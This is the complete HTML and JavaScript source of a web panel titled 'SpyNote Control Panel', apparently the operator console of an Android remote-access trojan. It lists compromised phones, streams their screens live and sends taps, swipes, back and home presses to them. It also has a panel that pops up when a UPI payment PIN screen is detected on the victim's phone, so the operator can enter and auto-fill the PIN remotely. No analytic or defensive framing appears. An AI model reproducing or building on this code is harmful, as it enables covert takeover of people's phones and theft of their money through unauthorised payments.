<!DOCTYPE html>
<html>
<head>
    <title>üì± SpyNote Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #1a1a1a, #2d2d2d); 
            color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 10px; left: 10px; 
            background: rgba(0,0,0,0.9); padding: 15px; 
            max-height: 80vh; overflow-y: auto; width: 280px; 
            border-radius: 10px; backdrop-filter: blur(10px);
        }
        .device { padding: 12px; margin: 8px 0; background: #333; cursor: pointer; 
            border-radius: 8px; transition: all 0.3s; }
        .device:hover { background: #555; transform: translateX(5px); }
        .active { background: #00ff88 !important; color: #000; }
        .disconnected { opacity: 0.5; }

        #phone-frame {
            width: 400px; height: 800px; margin: 20px auto; 
            background: #000; border: 25px solid #333; border-radius: 50px; 
            position: relative; cursor: pointer; touch-action: none;
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
        }
        #screen { 
            width: 100%; height: 100%; background: #111; border-radius: 20px;
            image-rendering: pixelated; image-rendering: -webkit-optimize-contrast;
        }
        #fps-counter { position: fixed; top: 10px; right: 150px; font-size: 12px; color: #00ff88; }
        
        #upi-panel {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            background: rgba(0,0,0,0.95); padding: 25px; border-radius: 15px;
            border: 2px solid #00ff88; display: none; backdrop-filter: blur(20px);
            min-width: 300px; text-align: center;
        }
        #upi-panel.active { display: block; animation: pulse 1s infinite; }
        @keyframes pulse { 0%,100%{box-shadow:0 0 20px #00ff88;} 50%{box-shadow:0 0 40px #00ff88;} }
        
        #pin-input { width: 120px; padding: 12px; font-size: 20px; text-align: center;
            background: #111; color: #00ff88; border: 2px solid #00ff88; border-radius: 10px;
            font-family: monospace; letter-spacing: 3px; margin: 10px; }
        #autofill-toggle { margin: 10px 0; font-size: 16px; }
        
        #controls { text-align: center; position: fixed; bottom: 20px; 
            left: 50%; transform: translateX(-50%); }
        button {
            padding: 12px 25px; margin: 5px; background: linear-gradient(45deg, #007bff, #0056b3); 
            color: white; border: none; border-radius: 20px; cursor: pointer; 
            font-size: 14px; font-weight: bold; transition: all 0.3s;
            box-shadow: 0 5px 15px rgba(0,123,255,0.4);
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0,123,255,0.6); }
        button.danger { background: linear-gradient(45deg, #ff4444, #cc0000); }
        #status { position: fixed; top: 10px; right: 10px; background: rgba(0,0,0,0.8); 
            padding: 10px; border-radius: 5px; font-size: 12px; }
        .upi-status { color: #00ff88 !important; font-weight: bold; }
    </style>
</head>
<body>
    <div id="devices">
        <h3>üì± Devices</h3>
        <div id="device-list">Loading...</div>
    </div>
    
    <div id="status">
        <div>Status: <span id="connectionStatus">Connecting...</span></div>
        <div>FPS: <span id="fps">0</span> | Device: <span id="selectedDevice">-</span></div>
        <div id="upi-status">UPI: <span id="upiDetectStatus">Waiting...</span></div>
    </div>
    <div id="fps-counter">FPS: 0</div>

    <div id="phone-frame">
        <canvas id="screen"></canvas>
    </div>

    <div id="controls">
        <button onclick="sendBack()">üîô Back</button>
        <button onclick="sendHome()">üè† Home</button>
        <button onclick="toggleFullScreen()">üì± Full</button>
    </div>

    <!-- üî• UPI PIN PANEL -->
    <div id="upi-panel">
        <h3>üîê UPI PIN Detected</h3>
        <div>Enter 4-6 digit PIN:</div>
        <input type="password" id="pin-input" maxlength="6" placeholder="1234">
        <br>
        <label><input type="checkbox" id="autofill-toggle" checked> Auto-fill ON</label>
        <br>
        <button onclick="submitPin()">‚úÖ Submit PIN</button>
        <button class="danger" onclick="closeUpiPanel()">‚ùå Close</button>
        <div id="pin-status" style="margin-top:10px;font-size:12px;"></div>
    </div>

    <script>
        const socket = io();
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 1920;
        let lastFrameTime = 0, frameCount = 0;
        let autofillEnabled = true;

        const canvas = document.getElementById('screen');
        const ctx = canvas.getContext('2d');
        const phoneFrame = document.getElementById('phone-frame');
        const deviceList = document.getElementById('device-list');
        const connectionStatus = document.getElementById('connectionStatus');
        const selectedDevice = document.getElementById('selectedDevice');
        const fpsCounter = document.getElementById('fps-counter');
        const fpsDisplay = document.getElementById('fps');
        const upiStatus = document.getElementById('upiDetectStatus');
        const upiPanel = document.getElementById('upi-panel');
        const pinInput = document.getElementById('pin-input');
        const autofillToggle = document.getElementById('autofill-toggle');
        const pinStatus = document.getElementById('pin-status');

        // Socket events
        socket.on('connect', () => {
            connectionStatus.textContent = '‚úÖ Connected';
            connectionStatus.style.color = '#00ff88';
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        socket.on('upi-detected', (data) => {
            if (data.deviceId === currentDevice) {
                upiStatus.textContent = 'UPI PIN PAGE DETECTED!';
                upiStatus.className = 'upi-status';
                upiPanel.classList.add('active');
                pinInput.focus();
                pinInput.select();
            }
        });

        socket.on('upi-filled', () => {
            pinStatus.textContent = '‚úÖ PIN Auto-filled!';
            pinStatus.style.color = '#00ff88';
        });

        socket.on('upi-status', (data) => {
            upiStatus.textContent = data.status;
            upiStatus.style.color = data.enabled ? '#00ff88' : '#ff8888';
        });

        // Screen rendering
        socket.on('screen-update', (data) => {
            if (data.deviceId !== currentDevice) return;
            try {
                deviceWidth = data.width;
                deviceHeight = data.height;
                const img = new Image();
                img.onload = () => {
                    const rect = phoneFrame.getBoundingClientRect();
                    canvas.width = rect.width;
                    canvas.height = rect.height;
                    ctx.imageSmoothingEnabled = false;
                    ctx.drawImage(img, 0, 0, rect.width, rect.height);
                    frameCount++;
                    const now = performance.now();
                    if (now - lastFrameTime >= 1000) {
                        const fps = Math.round(frameCount * 1000 / (now - lastFrameTime));
                        fpsCounter.textContent = `FPS: ${fps}`;
                        fpsDisplay.textContent = fps;
                        frameCount = 0;
                        lastFrameTime = now;
                    }
                };
                img.src = 'data:image/jpeg;base64,' + data.data;
            } catch (e) {
                console.error('Screen update error:', e);
            }
        });

        fetch('/devices').then(r => r.json()).then(updateDeviceList);

        function updateDeviceList(devices) {
            deviceList.innerHTML = devices.length ? 
                devices.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
                         onclick="selectDevice('${id}', this)">
                        <b>${info.model || id.slice(0,8)}</b><br>
                        <small>${info.brand} ${info.version || ''}</small>
                        ${info.connected ? 'üü¢ LIVE' : 'üî¥ OFF'}
                    </div>
                `).join('') : 'No devices';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            selectedDevice.textContent = deviceId.slice(0,8);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            socket.emit('control', { deviceId });
        }

        // Touch/Mouse Controls
        let startX = 0, startY = 0, dragging = false;

        function getScaledCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            return {
                x: Math.floor((clientX - rect.left) * scaleX),
                y: Math.floor((clientY - rect.top) * scaleY)
            };
        }

        ['mousedown', 'touchstart'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                e.preventDefault();
                dragging = true;
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                startX = coords.x; startY = coords.y;
                sendTap(startX, startY);
            });
        });

        ['mousemove', 'touchmove'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                if (!dragging || !currentDevice) return;
                e.preventDefault();
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                sendSwipe(startX, startY, coords.x, coords.y);
            });
        });

        ['mouseup', 'touchend'].forEach(event => {
            phoneFrame.addEventListener(event, e => dragging = false);
        });

        function sendTap(x, y) {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'tap', x, y });
        }

        function sendSwipe(sx, sy, ex, ey) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, action: 'swipe', 
                startX: sx, startY: sy, endX: ex, endY: ey 
            });
        }

        function sendBack() {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'back' });
        }

        function sendHome() {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'home' });
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }

        // üî• UPI PIN Functions
        autofillToggle.onchange = () => {
            autofillEnabled = autofillToggle.checked;
            socket.emit('autofill-toggle', { deviceId: currentDevice, enabled: autofillEnabled });
        };

        pinInput.oninput = () => {
            pinStatus.textContent = '';
        };

        function submitPin() {
            const pin = pinInput.value.trim();
            if (pin.length < 4) {
                pinStatus.textContent = '‚ùå Enter 4-6 digits';
                pinStatus.style.color = '#ff4444';
                return;
            }
            socket.emit('submit-pin', { deviceId: currentDevice, pin });
            pinStatus.textContent = '‚è≥ Sending PIN...';
        }

        function closeUpiPanel() {
            upiPanel.classList.remove('active');
            socket.emit('upi-close', { deviceId: currentDevice });
        }

        // Enter key support
        pinInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') submitPin();
        });
    </script>
</body>
</html>
